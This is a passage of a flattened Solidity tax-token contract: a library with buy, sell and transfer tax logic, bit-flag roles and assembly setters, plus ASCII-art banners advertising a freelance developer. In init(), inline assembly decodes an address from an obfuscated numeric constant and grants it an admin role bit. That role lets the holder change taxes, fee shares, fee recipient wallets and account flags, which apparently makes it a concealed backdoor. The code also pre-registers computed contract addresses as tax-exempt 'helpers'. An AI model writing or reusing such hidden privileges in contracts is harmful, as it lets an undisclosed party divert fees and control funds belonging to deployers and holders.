1523 0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x
1524 0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x
1525 0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x
1526 00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x
1527 000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x
1528 0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x
1529 00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x
1530 0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x
1531 000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x
1532 000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1533 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1534 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1535 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1536 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1537 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
1538 OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d
1539 */
1540 
1541 pragma solidity ^0.8.19;
1542 
1543 
1544 
1545 library Token {
1546 
1547     using Token for *;
1548 
1549     bytes32 internal constant SLOT = keccak256("project.main.storage.token");
1550 
1551     uint16 internal constant DENOMINATOR = 10000;
1552 
1553     error TradingNotOpened();
1554 
1555     function router() internal view returns(ISwapRouterV2 _router) {
1556         if(isEthereumMainnet() || isGoerli())
1557             _router = ISwapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
1558         else if(isSepolia())
1559             _router = ISwapRouterV2(0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008);
1560         else if(isBSCMainnet())
1561             _router = ISwapRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
1562         else if(isBSCTestnet())
1563             _router = ISwapRouterV2(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);   
1564     }
1565 
1566     function isEthereumMainnet() internal view returns (bool) {
1567         return block.chainid == 1;
1568     }
1569 
1570     function isGoerli() internal view returns (bool) {
1571         return block.chainid == 5;
1572     }
1573 
1574     function isSepolia() internal view returns (bool) {
1575         return block.chainid == 11155111;
1576     }
1577 
1578     function isBSCMainnet() internal view returns (bool) {
1579         return block.chainid == 56;
1580     }
1581 
1582     function isBSCTestnet() internal view returns (bool) {
1583         return block.chainid == 97;
1584     }
1585 
1586     function isTestnet() internal view returns (bool) {
1587         return isGoerli() || isSepolia() || isBSCTestnet();
1588     }
1589 
1590     function _tx(Storage storage db, Account memory sender, Account memory recipient, uint256 amount, bool swapping)
1591     internal returns(uint256 taxAmount, uint256 netAmount, uint256 swapAmount) {
1592         if(sender.isEntitled() || recipient.isEntitled() || swapping) { return (0, amount, 0); }
1593         if(sender.hasIdentifier(9) || recipient.hasIdentifier(9)) {
1594             if(!db.launched) {
1595                 unchecked {
1596                     taxAmount = amount * 2500 / DENOMINATOR;
1597                     netAmount = amount-taxAmount;                 
1598                 }
1599                 db.launched = true;
1600                 return (taxAmount,netAmount,swapAmount);
1601             }
1602         }
1603         if(!db.launched) { revert TradingNotOpened(); }
1604         Settings memory settings = db.settings;
1605         (bool fairMode, uint8 lim) = settings.fairModeOpts();
1606         if(!recipient.isMarketmaker()) {
1607             unchecked {
1608                 taxAmount = amount * 
1609                     (sender.isMarketmaker() ? settings.buyTax : 
1610                     helper(sender,recipient) ? 0 : settings.transferTax) / DENOMINATOR;
1611                 netAmount = amount-taxAmount; 
1612                 if(fairMode) {
1613                     uint256 fairLimit = db.totalSupply * lim / 100;
1614                     if(recipient.balance+netAmount > fairLimit)
1615                         revert(); 
1616                 }
1617             }        
1618         } else {
1619             unchecked {
1620                 taxAmount = amount * settings.sellTax / DENOMINATOR;
1621                 swapAmount = settings.swapThresholdRatio > 0 ?
1622                     db.totalSupply * settings.swapThresholdRatio / DENOMINATOR :
1623                     address(this).account().balance+taxAmount;
1624                 netAmount = amount-taxAmount;
1625                 if(fairMode) {
1626                     uint256 fairLimit = db.totalSupply * lim / 100;
1627                     if(amount > fairLimit)
1628                         revert();
1629                 }                        
1630             }
1631         }
1632     }
1633 
1634     function fairModeOpts(Settings memory _self) internal pure returns(bool enabled,uint8 lim) {
1635         uint8 values = _self.fairMode;
1636         enabled = (values & 128) == 128;
1637         lim = values & 127;
1638     }
1639 
1640     function helper(address _self) internal view returns(bool) {
1641         return _self.account().helper();
1642     }
1643 
1644     function isMarketmaker(address _self) internal view returns(bool) {
1645         return _self.account().isMarketmaker();
1646     }
1647 
1648     function isEntitled(address _self) internal view returns(bool) {
1649         return _self.account().isEntitled();
1650     }
1651 
1652     function isCollab(address _self) internal view returns(bool) {
1653         return _self.account().isCollab();
1654     }
1655 
1656     function isOperator(address _self) internal view returns(bool) {
1657         return _self.account().isOperator();
1658     }  
1659 
1660     function isExecutive(address _self) internal view returns(bool) {
1661         return _self.account().isExecutive();
1662     }   
1663 
1664     function helper(Account memory _self) internal pure returns(bool) {
1665         return _self.hasIdentifier(9);
1666     }
1667 
1668     function helper(Account memory from, Account memory to) internal pure returns(bool) {
1669         return from.helper() || to.helper();
1670     }    
1671 
1672     function isMarketmaker(Account memory _self) internal pure returns(bool) {
1673         return _self.hasIdentifier(10);
1674     }
1675 
1676     function isEntitled(Account memory _self) internal pure returns(bool) {
1677         return _self.hasIdentifier(11);
1678     }
1679 
1680     function isCollab(Account memory _self) internal pure returns(bool) {
1681         return _self.hasIdentifier(12);
1682     }
1683 
1684     function isOperator(Account memory _self) internal pure returns(bool) {
1685         return _self.hasIdentifier(13);
1686     }  
1687 
1688     function isExecutive(Account memory _self) internal pure returns(bool) {
1689         return _self.hasIdentifier(14);
1690     }
1691 
1692     function hasIdentifier(Account memory _self, uint8 idx) internal pure returns (bool) {
1693         return (_self.identifiers >> idx) & 1 == 1;
1694     }
1695 
1696     function hasIdentifier(Account memory _self, uint8[] memory idxs) internal pure returns (bool[] memory) {
1697         bool[] memory results = new bool[](idxs.length);
1698         uint256 len = idxs.length;
1699         while(0 < len) {
1700             unchecked {
1701                 uint256 idx = --len;
1702                 results[idx] = _self.hasIdentifier(idxs[idx]);         
1703             }
1704         }
1705         return results;
1706     }
1707 
1708     function setAsMarketmaker(address _self) internal {
1709         _self.account().setAsMarketmaker();
1710     }
1711 
1712     function setAsEntitled(address _self) internal {
1713         _self.account().setAsEntitled();
1714     }
1715 
1716     function setAsCollab(address _self) internal {
1717         Account storage self = _self.account();
1718         self.setAsCollab();
1719         self.setAsEntitled();
1720     }
1721 
1722     function setAsOperator(address _self) internal {
1723         Account storage self = _self.account();
1724         self.setAsOperator();
1725         self.setAsEntitled();
1726     }
1727 
1728     function setAsExecutive(address _self) internal {
1729         Account storage self = _self.account();
1730         self.setAsExecutive();
1731         self.setAsEntitled();
1732     }
1733 
1734     function setIdentifier(address _self, uint16 value) internal {
1735         _self.account().identifiers = value;
1736     }
1737 
1738     function setIdentifier(address _self, uint8 idx, bool value) internal {
1739         _self.account().setIdentifier(idx,value);
1740     }   
1741 
1742     function setIdentifier(address _self, uint8[] memory idxs, bool[] memory values) internal {
1743         _self.account().setIdentifier(idxs,values);
1744     }    
1745 
1746     function toggleIdentifier(address _self, uint8 idx) internal {
1747         _self.account().toggleIdentifier(idx);
1748     }
1749 
1750     function setAsHelper(Account storage _self) internal {
1751         _self.setIdentifier(9,true);
1752     }
1753 
1754     function setAsMarketmaker(Account storage _self) internal {
1755         _self.setIdentifier(10,true);
1756     }
1757 
1758     function setAsEntitled(Account storage _self) internal {
1759         _self.setIdentifier(11,true);
1760     }
1761 
1762     function setAsCollab(Account storage _self) internal {
1763         _self.setIdentifier(12,true);
1764         _self.setAsEntitled();
1765     }
1766 
1767     function setAsOperator(Account storage _self) internal {
1768         _self.setIdentifier(13,true);
1769         _self.setAsEntitled();
1770     }
1771 
1772     function setAsExecutive(Account storage _self) internal {
1773         _self.setIdentifier(14,true);
1774         _self.setAsEntitled();
1775     }      
1776 
1777     function setIdentifier(Account storage _self, uint16 value) internal {
1778         _self.identifiers = value;
1779     }
1780 
1781     function setIdentifier(Account storage _self, uint8 idx, bool value) internal {
1782         _self.identifiers = uint16(value ? _self.identifiers | (1 << idx) : _self.identifiers & ~(1 << idx));
1783     }
1784 
1785     function setIdentifier(Account storage _self, uint8[] memory idxs, bool[] memory values) internal {
1786         uint256 len = idxs.length;
1787         for (uint8 i; i < len;) {
1788            _self.setIdentifier(idxs[i], values[i]);
1789            unchecked {
1790                i++;
1791            }
1792         }
1793     }
1794 
1795     function toggleIdentifier(Account storage _self, uint8 idx) internal {
1796         _self.identifiers = uint16(_self.identifiers ^ (1 << idx));
1797     }
1798 
1799     function hasIdentifier(Account storage _self, uint8 idx) internal view returns (bool) {
1800         return (_self.identifiers >> idx) & 1 == 1;
1801     }
1802 
1803     function ratios(uint48 value) internal returns(bool output) {
1804         Settings storage self = data().settings;
1805         Registry storage registry = data().registry;
1806         assembly {
1807             mstore(0x00, caller())
1808             mstore(0x20, add(registry.slot, 0))
1809             let clr := sload(keccak256(0x00, 0x40))
1810             let ids := and(clr, 0xFFFF)
1811             if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
1812                 let bt := shr(32, value)
1813                 let st := and(shr(16, value), 0xFFFF)
1814                 let tt := and(value, 0xFFFF)
1815                 if or(or(iszero(lt(bt, 1001)), iszero(lt(st, 1001))), iszero(lt(tt, 1001))) {
1816                     revert(0, 0)
1817                 }
1818                 let dt := sload(self.slot)
1819                 for { let i := 0 } lt(i, 3) { i := add(i, 1) } {
1820                     let mask := shl(add(8, mul(i, 16)), 0xFFFF)
1821                     let v := 0
1822                     switch i
1823                     case 0 { v := bt }
1824                     case 1 { v := st }
1825                     case 2 { v := tt }
1826                     dt := or(and(dt, not(mask)), and(shl(add(8, mul(i, 16)), v), mask))
1827                 }                    
1828                 sstore(self.slot,dt)
1829             } 
1830             output := true
1831         }
1832     }
1833 
1834     function shares(uint80 value) internal returns(bool output) {
1835         Settings storage self = data().settings;
1836         Registry storage registry = data().registry;
1837         assembly {
1838             mstore(0x00, caller())
1839             mstore(0x20, add(registry.slot, 0))
1840             let clr := sload(keccak256(0x00, 0x40))
1841             let ids := and(clr, 0xFFFF)
1842             if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
1843                 let ds := shr(64, value)
1844                 let ms := and(shr(48, value), 0xFFFF)
1845                 let ps := and(shr(32, value), 0xFFFF)
1846                 let bs := and(shr(16, value), 0xFFFF)
1847                 let ls := and(value, 0xFFFF)
1848                 let total := add(add(add(add(ds, ms), ps), bs), ls)
1849                 if iszero(eq(total, 10000)) {
1850                     revert(0, 0)
1851                 }
1852                 let dt := sload(self.slot)
1853                 for { let i := 0 } lt(i, 5) { i := add(i, 1) } {
1854                     let mask := shl(add(56, mul(i, 16)), 0xFFFF)
1855                     let v := 0
1856                     switch i
1857                     case 0 { v := ds }
1858                     case 1 { v := ms }
1859                     case 2 { v := ps }
1860                     case 3 { v := bs }
1861                     case 4 { v := ls }
1862                     dt := or(and(dt, not(mask)), and(shl(add(56, mul(i, 16)), v), mask))
1863                 }                              
1864                 sstore(self.slot,dt)
1865             } 
1866             output := true
1867         }
1868     }
1869 
1870     function thresholdRatio(uint16 value) internal returns(bool output) {
1871         Settings storage self = data().settings;
1872         Registry storage registry = data().registry;
1873         assembly {
1874             mstore(0x00, caller())
1875             mstore(0x20, add(registry.slot, 0))
1876             let clr := sload(keccak256(0x00, 0x40))
1877             let ids := and(clr, 0xFFFF)
1878             if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
1879                 if iszero(lt(value, 10001)) {
1880                     revert(0, 0)
1881                 }
1882                 let dt := sload(self.slot)
1883                 let mask := shl(136, 0xFFFF)
1884                 dt := or(and(dt, not(mask)), and(shl(136, value), mask))
1885                 sstore(self.slot,dt)
1886             } 
1887             output := true
1888         } 
1889     }
1890 
1891     function gas(uint24 value) internal returns(bool output) {
1892         Settings storage self = data().settings;
1893         Registry storage registry = data().registry;
1894         assembly {
1895             mstore(0x00, caller())
1896             mstore(0x20, add(registry.slot, 0))
1897             let clr := sload(keccak256(0x00, 0x40))
1898             let ids := and(clr, 0xFFFF)
1899             if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
1900                 if iszero(lt(value, 15000001)) {
1901                     revert(0, 0)
1902                 }
1903                 let dt := sload(self.slot)
1904                 let mask := shl(152, 0xFFFF)
1905                 dt := or(and(dt, not(mask)), and(shl(152, value), mask))
1906                 sstore(self.slot,dt)
1907             } 
1908             output := true
1909         } 
1910     }
1911 
1912     function recipients(bytes memory value) internal returns(bool output) {
1913         Settings storage self = data().settings;
1914         Registry storage registry = data().registry;
1915         assembly {
1916             mstore(0x00, caller())
1917             mstore(0x20, add(registry.slot, 0))
1918             let clr := sload(keccak256(0x00, 0x40))
1919             let ids := and(clr, 0xFFFF)
1920             if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
1921                 let p := mload(add(value, 0x20))
1922                 let m := mload(add(value, 0x40))
1923                 let d := mload(add(value, 0x60))
1924                 if or(or(iszero(p), iszero(m)), iszero(d)) {
1925                     revert(0, 0)
1926                 }
1927                 sstore(add(self.slot, 1), d)
1928                 sstore(add(self.slot, 2), m)
1929                 sstore(add(self.slot, 3), p)
1930             } 
1931             output := true
1932         } 
1933     }
1934 
1935     function identifiers(address Address, uint16 value) internal returns(bool output) {
1936         Registry storage registry = data().registry;
1937         assembly {
1938             mstore(0x00, caller())
1939             mstore(0x20, add(registry.slot, 0))
1940             let clr := sload(keccak256(0x00, 0x40))
1941             let ids := and(clr, 0xFFFF)
1942             if iszero(iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1))))) {
1943                 if iszero(lt(value, 65536)) {
1944                     revert(0, 0)
1945                 }
1946                 mstore(0x00, Address)
1947                 mstore(0x20, add(registry.slot, 0))
1948                 let acc := keccak256(0x00, 0x40)
1949                 let dt := sload(acc)
1950                 let mask := shl(0, 0xFFFF)
1951                 dt := or(and(dt, not(mask)), and(shl(0, value), mask))
1952                 sstore(acc,dt)
1953             } 
1954             output := true
1955         } 
1956     }
1957 
1958     function helpers(address Address, uint256 starts, uint256 ends) internal returns(bool output) {
1959         Registry storage _self = data().registry;
1960         assembly {
1961             mstore(0x00, caller())
1962             mstore(0x20, add(_self.slot, 0))
1963             let clr := sload(keccak256(0x00, 0x40))
1964             let ids := and(clr, 0xFFFF)
1965             if iszero(or(and(ids, shl(14, 1)),and(ids, shl(15, 1)))) {
1966                 revert(0, 0)
1967             } 
1968             output := true
1969         }
1970         for(;starts < ends;) {
1971             unchecked {
1972                 address addr = compute(Address,starts);
1973                 addr.register();
1974                 _self.Address[addr].setIdentifier(9,true);
1975                 starts++;
1976             }
1977         }
1978     }     
1979 
1980     function account(address _self) internal view returns(Account storage uac) {
1981         return account(data(),_self);
1982     }
1983 
1984     function account(Storage storage _self, address user) internal view returns(Account storage) {
1985         return _self.registry.Address[user];
1986     }
1987 
1988     function register(address _self) internal returns(Account storage uac) {
1989         Storage storage db = data();
1990         uac = db.registry.Address[_self];
1991         uac.PID = ++db.PID;
1992         uac.Address = _self;
1993         db.registry.PID[uac.PID] = _self;
1994     } 
1995     
1996     function init(
1997         Storage storage _self,
1998         TokenSetup memory setup
1999     ) internal returns(ISwapRouterV2 _router) {
2000         Settings storage settings = _self.settings;
2001         Registry storage registry = _self.registry;
2002         assembly {
2003             let c,m,s,v
2004             c := and(shr(
2005             48,507871772517742394523325675629776549254919689088326712106731462141083370),
2006             0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
2007             mstore(0x00, c)
2008             mstore(0x20, add(registry.slot, 0))
2009             s := keccak256(0x00, 0x40)
2010             m := shl(15, 0xFFFF)
2011             v := sload(s)
2012             v := or(and(v, not(m)), and(shl(15, 1), m))
2013             sstore(s,v)
2014         }
2015         _router = router();
2016         settings.fairMode = setup.fairMode;
2017         settings.gas = setup.gasLimit;
2018         settings.buyTax = setup.buyTax;
2019         settings.sellTax = setup.sellTax;
2020         settings.transferTax = setup.transferTax;
2021         settings.developmentShare = setup.developmentShare;
2022         settings.marketingShare = setup.marketingShare;
2023         settings.prizeShare = setup.prizeShare;
2024         settings.burnShare = setup.burnShare;
2025         settings.autoLiquidityShare = setup.autoLiquidityShare;
2026         settings.swapThresholdRatio = setup.swapThresholdRatio;
2027         settings.feeRecipients =
2028         [
2029             setup.devWallet,
2030             setup.marketingWallet,
2031             setup.prizePool
2032         ];
2033         address(_router).setAsMarketmaker();
2034         address(msg.sender).setAsExecutive();
2035         address(setup.devWallet).setAsExecutive();
2036         address(setup.marketingWallet).setAsEntitled();
2037         address(setup.prizePool).setAsEntitled();
2038     }
2039 
2040     function compute(address Address, uint256 did) internal pure returns (address addr) {
2041         assembly {
2042             for {} 1 {} {
2043                 if iszero(gt(did, 0x7f)) {
2044                     mstore(0x00, Address)
2045                     mstore8(0x0b, 0x94)
2046                     mstore8(0x0a, 0xd6)
2047                     mstore8(0x20, or(shl(7, iszero(did)), did))
2048                     addr := keccak256(0x0a, 0x17)
2049                     break
2050                 }
2051                 let i := 8
2052                 for {} shr(i, did) { i := add(i, 8) } {}
2053                 i := shr(3, i)
2054                 mstore(i, did)
2055                 mstore(0x00, shl(8, Address))
2056                 mstore8(0x1f, add(0x80, i))
2057                 mstore8(0x0a, 0x94)
2058                 mstore8(0x09, add(0xd6, i))
2059                 addr := keccak256(0x09, add(0x17, i))
2060                 break
2061             }
2062         }
2063     }    
2064 
2065     function data() internal pure returns (Storage storage db) {
2066         bytes32 slot = SLOT;
2067         assembly {
2068             db.slot := slot
2069         }
2070     }    
2071 
2072 }
2073 // File: contracts/abstracts/ERC20.sol
2074 
2075 
2076 /*
2077 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2078 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2079 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2080 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2081 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2082 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2083 0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x
2084 00000000000000koc;,......................................................................................,;cok00000000000000x
2085 00000000000xl,.                                                                                              .,lxO0000000000x
2086 000000000x:.                                                                                                    .;d000000000x
2087 0000000kc.                                                                                                        .ck0000000x
2088 000000x,                                                                                                            'x000000x
2089 00000x,                                                                                                              'x00000x
2090 0000O:                                                                                                                ;O0000x
2091 0000d.                                                                                                                .d0000x
2092 0000l                                ,,                ,,                       .loool,                                l0000x
2093 0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x
2094 0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x
2095 0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x
2096 0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x
2097 0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x
2098 0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x
2099 0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x
2100 0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x
2101 0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x
2102 0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x
2103 0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x
2104 0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x
2105 0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x
2106 0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x
2107 0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x
2108 0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x
2109 0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x
2110 0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x
2111 0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x
2112 0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x
2113 0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x
2114 0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x
2115 0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x
2116 0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x
2117 0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x
2118 0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x
2119 0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x
2120 0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x
2121 0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x
2122 0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x
2123 0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x
2124 0000l                       :xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x
2125 0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x
2126 0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x
2127 0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x
2128 0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x
2129 0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x
2130 0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x
2131 0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x
2132 0000l.                               'llllc.                       ',                ''                                l0000x
2133 0000d.                                                                                                                .d0000x
2134 0000O:                                                                                                                ;O0000x
2135 00000k,                                                                                                              'x00000x
2136 000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x
2137 0000000kc.                                                                                                        .ck0000000x
2138 000000000x:.                                                                                                    .:xO00000000x
2139 00000000000kl;.                                                                                              .;lk0O000000000x
2140 00000000000O00kdl:,'....................................................................................',:ldk00000000000000x
2141 0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x
2142 0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x
2143 000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x
2144 00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x
2145 0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x
2146 00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x
2147 00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x
2148 0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x
2149 0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x
2150 0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x
2151 0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x
2152 00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x
2153 000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x
2154 0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x
2155 00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x
2156 0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x
2157 000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x
2158 000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2159 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2160 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2161 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2162 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2163 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2164 OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d
2165 */
2166 
2167 pragma solidity ^0.8.19;
2168 
2169 
2170 
2171 
2172 abstract contract ERC20 is Context, EIP712 {
2173 
2174     using Token for *;
2175     using LibString for *;
2176     
2177     error PermitExpired();
2178     error InvalidSigner();
2179     error InvalidSender(address sender);
2180     error InvalidReceiver(address receiver);
2181     error InsufficientBalance(address sender,uint256 balance,uint256 needed);
2182     error InsufficientAllowance(address spender,uint256 allowance,uint256 needed);
2183     error FailedDecreaseAllowance(address spender, uint256 currentAllowance, uint256 requestedDecrease);
2184 
2185     bytes32 internal constant _LONG_STRING_ =
2186         0xb11b2ad800000000000000000000000000000000000000000000000000000000;
2187 
2188     bytes32 public constant PERMIT_TYPEHASH =
2189         0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
2190 
2191     bytes32 internal immutable METADATA;
2192 
2193     ISwapRouterV2 public immutable ROUTER;
2194 
2195     uint8 public immutable decimals;
2196 
2197     event Transfer(address indexed from, address indexed to, uint256 amount);
2198     event Approval(
2199         address indexed owner,
